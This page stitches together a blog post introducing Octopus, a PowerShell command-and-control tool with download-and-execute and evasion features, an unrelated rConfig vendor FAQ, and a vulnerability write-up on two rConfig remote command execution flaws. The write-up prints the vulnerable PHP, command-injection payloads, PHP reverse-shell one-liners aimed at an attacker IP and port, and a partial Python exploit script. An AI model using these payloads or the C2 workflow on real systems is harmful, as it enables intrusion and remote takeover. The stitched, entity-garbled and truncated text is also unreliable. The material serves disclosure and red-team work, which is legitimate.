# Unveiling Octopus: The pre-operation C2 for Red Teamers

Posted on 2019-12-102019-12-11 by [Askar](https://shells.systems/author/askar/)

Estimated Reading Time:  6 minutes

This year in [BlackHat London 2019](https://www.blackhat.com/eu-19/), I presented my tool Octopus in BlackHat Arsenal, and it was really fun to present the tool in front of some talented hackers and hear a feedback about the tool from them.

So I just wanted to share a complete guide on how you can use Octopus the Pre-Operation C2 before you start your real operation, and I will mention why you have to use Octopus before your real operation.

## What is Octopus ?

Octopus is an open source, pre-operation C2 server based on python3 which can control an Octopus powershell agent through HTTP/S.

## Why to use Octopus ?

The main purpose of creating Octopus is for use before any red team operation, where rather than starting the engagement with your full operational arsenal and infrastructure, you can use Octopus first to attack the target and gather information before you start your actual red team operation without put your real infrastructure in risk!

Octopus is designed to be stealthy and covert while communicating with the C2, as it uses AES-256 by default for its encrypted channel between the powershell agent and the C2 server. You can also opt for using SSL/TLS by providing a valid certficate for your domain and configuring the Octopus C2 server to use it.

One cool feature in Octopus is called ESA, which stands for “Endpoint Situational Awareness”, which will gather some important information about the target that will help you to gain better understanding of the target network endpoints that you will face during your operation, thus giving you a shot to customize your real operation based on this information.

## Octopus Features ?

* Control agents through HTTP/S.
* Execute system commands.
* Download files.
* Load external Powershell modules.
* Use encrypted channels (AES-256) between C2 and agents.
* Use inconspicuous techniques to execute commands and transfer results.
* Create custom and multiple listeners for each target.
* Generate different types of payloads.
* Support all windows versions with powershell 2.0 and higher.
* Run Octopus windows executable agent without touching powershell.exe process.
* Create Custom profiles.
* Gather information automatically from the endpoint (endpoint situational awareness) feature.

## Octopus Installation

To install Octopus you just have to clone the latest version from the following URL:

```
https://github.com/mhaskar/Octopus
```

And execute the following to install all the python requirements:

```

sudo pip3 install -r requirement.txt

```

You can also install `mono-devel` to use the C# compilation feature inside Octopus from the following command:

```
apt install mono-devel
```

After that we are totally ready to use Octopus!

## Octopus Profiles

Octopus Profiles will let you control the URL structure for your C2, and you can customize it based on the scenarios you want to put your C2 on.

That will help avoiding any static IoCs or signature related to Octopus while using it on the wild.

You can edit the file **profile.py**to start building your own profile which contains the following main URLs:

* file\_receiver\_url : handles file downloading.
* report\_url : handle ESA reports.
* command\_send\_url : handles the commands that will be sent to the target.
* command\_receiver\_url : handles commands will be executed on the target.
* first\_ping\_url : handles the first connection from the target.
* server\_response\_header : this header will show in every response.

## Listeners

Once you customized a profile, you are now ready to create a listener for your operation, Octopus depends on HTTP/S to communicate with the agents in an asynchronous way.

The agent will try to communicate with the listener based on the interval time you set while you creating the listener, so if you created a listener and set the interval to 5 seconds for example, the agent will try to connect each 5 seconds and check if there is a command to execute or not.

Octopus will encrypt the data between the agent and the server by default using (AES-256 encryption) with a pre-generated hard-coded key in the agent.

> The next version of Octopus will has a key exchange algorithm that transfer the encryption key securely.

Octopus transfer the data in a legitimate way to mimic a normal user by sending and receiving a legitimate HTTP requests/response and embed the data in well known and used headers.

### HTTP Listener

You can create a HTTP Listener in octopus using the command “listen\_http” like the following:

```
listen_http listen_ip port hostname interval page listener_name
```

Of course you need to pass some options which are:

* BindIP: the IP address that will be used by the listener.
* BindPort: the port you want to listen on.
* Hostname: the hostname you will use to communicate with.
* Interval: How number of seconds the agent will wait before checking for commands.
* URL: The name of the page hosting the payload (ex: index.php).
* Listener\_name: Listener name to use.

> Please make sure to enter the options in the correct order

## HTTPS Listener

Using the HTTPS Listener you can communicate with your agents via SSL/TLS encrypted channel which will give you more power while communicating with the agents.

Of course you will need a domain name and a valid SSL certificates for that domain, so I suggest to read [this article](https://medium.com/%40saurabh6790/generate-wildcard-ssl-certificate-using-lets-encrypt-certbot-273e432794d7) to know how you can generate and use letsencrypt certificates.

We can create a HTTPS listener using the command “listen\_https” like the following:

```
listen_https listen_ip port hostname interval page listener_name certficate_path key_path
```

You need to pass some options which are:

* BindIP: the IP address that will be used by the listener.
* BindPort: the port you want to listen on.
* Hostname: the hostname you will use to communicate with.
* Interval: How number of seconds the agent will wait before checking for commands.
* URL: The name of the page hosting the payload (ex: index.php).
* Listener\_name: Listener name to use.
* certficate\_path : path for valid ssl certficate (called fullchain.pem for letsencrypt certficates)
* key\_path : path for valid key for the ssl cerficate (called key.pem for letsencrypt certficates)

After creating the listener on our domain “myc2.live”, we should see the following:

![](https://shells.systems/wp-content/uploads/2019/12/myc2.png)
## Generating agents

You can generate agents to communicate with your C2 via a specific listener you choose, the agents can do multiple tasks for you such as:

* Execute system commands.
* Load external powershell modules.
* Download files from the target machine.
* Run ESA module to gather some very useful information about the target

We can generate and deliver our agent using the following methods:

* Powershell one-liner
* HTA one-liner (reused from APT34)
* Windows executable (exe file)

### Generate Powershell one-liner

The powershell one-liner will give you the ability to generate a powershell command that download and execute your payload directly from your C2.

You can generate the powershell one-liner using the command “generate\_powershell” as the following:

```
generate_powershell listener_name
```
### Generate HTA one-liner

The HTA on-liner is reused from APT34, thanks to @ahmedkhlief he was able to reuse the code from APT34 threat group, which download the HTA file content from the C2 and run it using mshta.exe trusted windows binary to get the final powershell agent executed.

You can generate the HTA one-liner using the command “generate\_hta” as the following:

```
generate_hta listener_name
```
### Generate Windows executable (exe file)

Octopus can build a ready to use windows executable (exe file) for you using [mono-project](https://www.mono-project.com/docs/about-mono/languages/csharp/) to compile the C# agent to an executable.

Octopus use a technique called “unmanaged powershell” to execute the powershell script without touching the powershell.exe binary, which can help you to avoid any restrictions on powershell.exe.

Octopus will use “System.Management.Automation.dll” file to compile the C# code and then use the “PowerShell” object to start the powershell code execution.

The binary itself is very clean and undetected, and of course **it still under development,** So just wait for more updates on this feature before consider using it on the wild!

You can generate the exe file using the command “generate\_exe” as the following:

```
generate_exe listener_name output_path
```
## Interacting with agents

After getting a connection from any of your agents, you can list all the agents using the command “list” and to interact with a client, you can use the command “interact session” like the following:

### Execute system commands

After interacting with an agent, all you need to execute system command is just to type the command and wait for the results!

The command execution process is interactive, which means that anything you execute will remain in the same process context, such as changing directory, load modules for future usage and so on.

If there is any problem occurred during the command execution, the agent will return back the error as it is from powershell which can help you to define problems while executing your commands.

And here is an example of executing the command “ipconfig” for example on one of the agents:

### Load external powershell modules

You can also load powershell modules to Octopus to help you during your attack, you just have to copy the modules you want to use to “modules” directory then while interacting with the agent execute “load module\_name” to load the module directly and also you can use “modules” command to show all available modules.

> In this example I will show you how we can load powerview.ps1 and then execute Get-NetComputer

### Run ESA module to gather some very useful information about the target

The ESA module stands for “Endpoint Situational Awareness” which helps the attacker to get some extra information about the endpoint and the infrastructure such as:

* What is the build of the OS ?
* Which AV/EDR they are using ?
* Is they have Sysmon enabled ?
* Which SIEM collector they are using ?
* And among of some other information

You can use the ESA module after interacting with the agent using “report” command like the following:

### Download files from the target machine

You can use Octopus to download files from the targets machines, you just need to execute “download file\_path” to get the file downloaded.

![](https://shells.systems/wp-content/uploads/2019/12/download.png)

Download file from target

## Full Demo!

## Upcoming features

Well, there is A LOT of cool features coming to Octopus soon and some of them are in testing already, but first I need to release the stable version and make sure that there is no any problems with the code base.

Here are some of the coming features to Octopus:

* Implementing asymmetric encryption by default to exchange the encryption key
* Full front-end design customization via profile
* Enhancements on ESA module
* Add persistence modules
* Ability to take screenshots
* Generate agents with random strings

And you can suggest a feature or report an issue via the project [Github main repository](https://github.com/mhaskar/Octopus).

Frequent questions and answers

## Any Questions? Answered

We strive to make rConfig easy to choose, setup and use. If you have any questions, please feel free to
contact us. Here are some frequent questions we get asked about.

* What has
  happened to rConfig v3?

   As of February 2023 , this project is
  no longer maintained. rConfig v3 is fully deprecated and will no longer be supported on
  the public repository. It has been replaced by V6 Core. There is no direct upgrade path
  from V3 to V6 core. This notice does not affect customers with current subscription
  arrangements until the end of the term of those arrangements. rConfig v3 has been in
  development since 2010, and we are very proud of its impact and value for network
  professionals and businesses all over the globe. V3 Users should plan to migrate to V6
  Core ASAP.
* Do you
  have a trail version for V7 I can download?

   We've got your back with our 30-day
  Money Back Guarantee for all new subscribers. Dive into the full feature set worry-free,
  knowing that if rConfig doesn't match your expectations, you'll get a full refund. And
  check this out: our fresh V6 Core version lets you test-drive the core V7 features for
  free! You can contact us for a live demo and we will be happy to help.
* Why is
  rConfig V7 not free?

  We have spent 14 years building an amazing and valuable NCM, and 4 years dedicated to
  developing rConfig V7, a premium network management tool designed with
  enterprise-grade quality. We know that businesses depend on our tool and are prepared
  to invest in its continued development and exciting upcoming features. Plus, rConfig
  stands out by offering a fantastic return on investment (ROI) and remarkably low total
  cost of ownership (TCO). Unlike other Network Configuration Managers (NCMs), rConfig is
  investing in a strong innovative future with our flagship product.
* I work
  for non-profit, can I get rConfig V7 discounted?

  Yes. One of our core values is 'giving back', which is why we created rConfig as an open
  source, free project to begin with. Contact us directly for more information on our
  support for non-profit organisations. We require charity status for such Non-Profit
  organisations, and would need your charity ID with the request.

  Simply register an account on rConfig.com, login to the portal and apply for a discount
  by changing your team status and providing evidence of your status. A discount code for
  purchases will be assigned to your account.
* Which
  pricing plans should I choose?

  For hobbyists and small businesses, our
  V6 Core is an ideal NCM with unlimited backups, vendors and devices. The Pro plan suits networks with up to 1000 devices. For larger
  networks inclduing enterprise and MSPs, please contact us for pricing. This straightforward, tiered model
  simplifies pricing and removes any complexity.
* What are
  the plans for rConfig in the future?

  rConfig has been in developed over 14
  years, since 2010. We are aware that a few major NCM vendors are EOL-ing their products.
  And others have stagnated on product and service innovation, while most open source NCMs
  are unmaintained and unsecure. We are aware that the
  market is changing rapidly.
  Customers of all sizes are relying on rConfig and our product roadmap, integrations and
  innovations are unmatched. We are around for the long term, and look forward to the
  future of rConfig NCM and the introduction of key Automation Platform features.

# rConfig v3.9.2 authenticated and unauthenticated RCE (CVE-2019-16663) and (CVE-2019-16662)

Posted on 2019-10-252020-01-03 by [Askar](https://shells.systems/author/askar/)

![](https://shells.systems/wp-content/uploads/2019/09/burpsuite_rconfig.png)
Estimated Reading Time:  6 minutes
#### Summary about rConfig

rConfig is an open source network device configuration management utility for network engineers to take frequent configuration snapshots of their network devices.

#### About the exploit

I was able two detect two remote command execution vulnerabilities in two different files, the first one called “ajaxServerSettingsChk.php” file which suffers from an unauthenticated RCE that could triggered by sending a crafted GET request via “rootUname” parameter which is declared in line #2 and then passed to exec function in line #13 which you can inject it with a malicious OS command to be executed on the server, this vulnerability was straightforward to exploit and to discover and later on I will show you how to discover it and how to exploit it.

The second vulnerability has been discovered in a file called “search.crud.php” which suffers from an authenticated RCE that could triggered by sending a crafted GET request that contains two parameters, the first one called “searchTerm” and this parameter can contains any value you want , but it should be existed so we can reach the exec function in line #63.

I decided to hunt for a RCE as usual, So I started to list all unsafe functions using a very simple [python script](https://github.com/mhaskar/RCEScanner) I wrote which been used in a previous case studies.

### Analyzing the Unauthenticated RCE

After running the script, couple of results showed up to me, I start to check the files andnoticed that there is a file called “ajaxServerSettingsChk.php” located in **install/lib/ajaxHandlers/ajaxServerSettingsChk.php**which contains:

```

&amp;lt;?php
$rootUname = $_GET['rootUname'];
$array = array();
/* check PHP Safe_Mode is off */
if (ini_get('safe_mode')) {
    $array['phpSafeMode'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;bad&amp;amp;amp;quot;&amp;amp;amp;gt;Fail - php safe mode is on - turn it off before you proceed with the installation&amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;br/&amp;amp;amp;gt;';
} else {
    $array['phpSafeMode'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;Good&amp;amp;amp;quot;&amp;amp;amp;gt;Pass - php safe mode is off&amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;&amp;amp;amp;lt;br/&amp;amp;amp;gt;';
}

/* Test root account details */
$rootTestCmd1 = 'sudo -S -u ' . $rootUname . ' chmod 0777 /home 2&amp;amp;amp;gt;&amp;amp;amp;amp;1';
exec($rootTestCmd1, $cmdOutput, $err);
$homeDirPerms = substr(sprintf('%o', fileperms('/home')), -4);
if ($homeDirPerms == '0777') {
    $array['rootDetails'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;Good&amp;amp;amp;quot;&amp;amp;amp;gt;Pass - root account details are good &amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;&amp;amp;amp;lt;br/&amp;amp;amp;gt;';
} else {
    $array['rootDetails'] = '&amp;amp;amp;lt;strong&amp;amp;amp;gt;&amp;amp;amp;lt;font class=&amp;amp;amp;quot;bad&amp;amp;amp;quot;&amp;amp;amp;gt;The root details provided have not passed: ' . $cmdOutput[0] . '&amp;amp;amp;lt;/strong&amp;amp;amp;gt;&amp;amp;amp;lt;/font&amp;amp;amp;gt;&amp;amp;amp;lt;br/&amp;amp;amp;gt;';
}
// reset /home dir permissions
$rootTestCmd2 = 'sudo -S -u ' . $rootUname . ' chmod 0755 /home 2&amp;amp;amp;gt;&amp;amp;amp;amp;1';
exec($rootTestCmd2, $cmdOutput, $err);

echo json_encode($array);

```

As we can see in line #2 the scripts save a GET request called ‘rootUname’ and save it to ‘$rootUname’ variable, and in line #12 it concatenate the ‘$rootUname’ with some strings and save it to ‘rootTestCmd1’ variable in line #12 then pass it to exec function in line #13 and do the same for the rest of the lines.

So we just need to inject our command and escape the string on line #13 to get our command executed, and to do that we can use the following payload:

```
; your command #
```

To test it I will modify the code and echo the result of the **exec** function in line #13 then encode the payload and send it to get the following:

![](https://shells.systems/wp-content/uploads/2019/09/burp_rconfig_debug.png)

And as we can see the result of sending encoded “; id #” command in rootUname is to get the command executed successfully two times.

So, to get a shell we can use the following payload:

```
;php -r '$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);
```
> I used this payload to prevent using nc binary which is not installed by default in CentOS 7.7 mini.

And after encoding and sending the payload using Burp, we will get the following:

![](https://shells.systems/wp-content/uploads/2019/09/burpsuite_rconfig-1.png)

We popped a shell !

And to automate the process, I wrote a simple [python code](https://gist.github.com/mhaskar/ceb65fa4ca57c3cdccc1edfe2390902e) to exploit this vulnerability:

```

### Analyzing the Authenticated RCE

So , one of the other results that showed up on the RCE scanner, I got another interesting piece of code in file called “**lib/crud/search.crud.php**” contains the following:

```

    if (isset($_GET['searchTerm']) &amp;&amp; is_string($_GET['searchTerm']) &amp;&amp; !empty($_GET['searchTerm'])) {
        /* validation */
        $searchTerm = '&quot;' . $_GET['searchTerm'] . '&quot;';
        $catId = $_GET['catId'];
        $catCommand = $_GET['catCommand'];
        $nodeId = $_GET['nodeId'];
        $grepNumLineStr = $_GET['numLinesStr'];
        $grepNumLine = $_GET['noLines'];
        $username = $_SESSION['username'];

        // if nodeId was empty set it to blank
        if (empty($nodeId)) {
            $nodeId = '';
        } else {
            $nodeId = '/' . $nodeId . '/';
        }

        $returnArr = array();

        // Get the category Name from the Category selected
        $db2-&gt;query(&quot;SELECT categoryName from `categories` WHERE id = :catId&quot;);
        $db2-&gt;bind(':catId', $catId);
        $resultCat = $db2-&gt;resultset();
        $returnArr['category'] = $resultCat[0]['categoryName'];

        // get total file count
        $fileCount = array();
        $subDir = &quot;&quot;;
        if (!empty($returnArr['category'])) {
            $subDir = &quot;/&quot; . $returnArr['category'];
        }

        exec(&quot;find /home/rconfig/data&quot; . $subDir . $nodeId . &quot; -maxdepth 10 -type f | wc -l&quot;, $fileCountArr);
        $returnArr['fileCount'] = $fileCountArr['0'];

        //next find all instances of the search term under the specific cat/dir
        $command = 'find /home/rconfig/data' . $subDir . $nodeId . ' -name ' . $catCommand . ' | xargs grep -il ' . $grepNumLineStr . ' ' . $searchTerm . ' | while read file ; do echo File:&quot;$file&quot;; grep ' . $grepNumLineStr . ' ' . $searchTerm . ' &quot;$file&quot; ; done';
        // echo $command;die();
        exec($command, $searchArr);

```

First of all, we need to make sure to pass the first if statement in line #25 by sending a GET parameter called ‘searchTerm’ so we can get the body of the statement, then we need to send another GET parameter called ”catCommand” which will contain our payload that will be passed later on to exec in line #63 after being concatenated with some string in line #61 and stored to variable called $command which will be executed by exec function in line #63 as I mentioned.

So I will use a payload to test my theory about this vulnerability by using a sleep payload which will try to sleep for 5 seconds and then watch the response time and compare it with the normal one, and by looking at line #61 we can escape the string and execute our command using multiple payloads, and for the testing I will use this one:

```
&quot;&quot;&amp;&amp;$(`sleep 5`)#
```

And after sending it with Burp, we will get the following:

![](https://shells.systems/wp-content/uploads/2019/09/burp-sleep-rconfig.png)

Sucess! our sleep worked and we can confirm that the command is executed.

> There is TONS of ways to test the payload instead of sleep payload that you can use.

And to get a shell I used a php oneliner and constructed it to be usable with the concatenated string to be like the following:

```
&quot;&quot;&amp;amp;&amp;amp;php -r '$sock=fsockopen(&quot;192.168.178.1&quot;,1337);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'#
```

And to automate the process, I wrote a simple [python code](https://gist.github.com/mhaskar/e7e454c7cb0dd9a139b0a43691e258a0) to exploit this vulnerability:

```

    exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = sys.argv[5]

request = requests.session()

}

login_request = request.post(

     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+&quot;/dashboard.php&quot;, allow_redirects=False)

if dashboard_request.status_code == 200:
    print &quot;[+] LoggedIn successfully&quot;
    payload = '''&quot;&quot;&amp;amp;&amp;amp;php -r '$sock=fsockopen(&quot;{0}&quot;,{1});exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'#'''.format(ip, port)
    encoded_request = target+&quot;/lib/crud/search.crud.php?searchTerm=anything&amp;amp;catCommand={0}&quot;.format(quote(payload))
    print &quot;[+] triggering the payload&quot;
    print &quot;[+] Check your listener !&quot;
    exploit_req = request.get(encoded_request)

elif dashboard_request.status_code == 302:
    print &quot;[-] Wrong credentials !&quot;
    exit()

```

And after running the exploit we will get the following result:

we Popped a shell !

## vulnerability disclosure

I reported the two vulnerabilities on 19/09/2019 to rConfig main developer, but without getting any fix release date or even a statement that they will fix the vulnerability.

So after 35 days with no response I released the exploit.
